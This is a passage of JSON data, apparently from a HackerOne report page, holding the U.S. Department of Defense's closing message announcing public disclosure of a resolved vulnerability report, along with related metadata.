_concealed_member":false},{"id":8119428,"is_internal":false,"editable":false,"type":"Activities::CommentsClosed","message":"Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at VDP-Questions@dc3.mil if there are any questions, concerns or issues.","markdown_message":"\u003cp\u003eThanks for participating in the DoD Vulnerability Disclosure Program. We\u0026#39;re publicly disclosing your resolved report at this time.  We also lock the report on the disclosure but feel free to reach out to us at \u003ca title=\"VDP-Questions@dc3.mil\" href=\"mailto:VDP-Questions@dc3.mil\" rel=\"nofollow noopener noreferrer\"\u003eVDP-Questions@dc3.mil\u003c/a\u003e if there are any questions, concerns or issues.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-27T14:06:38.700Z","updated_at":"2020-05-27T14:06:38.700Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}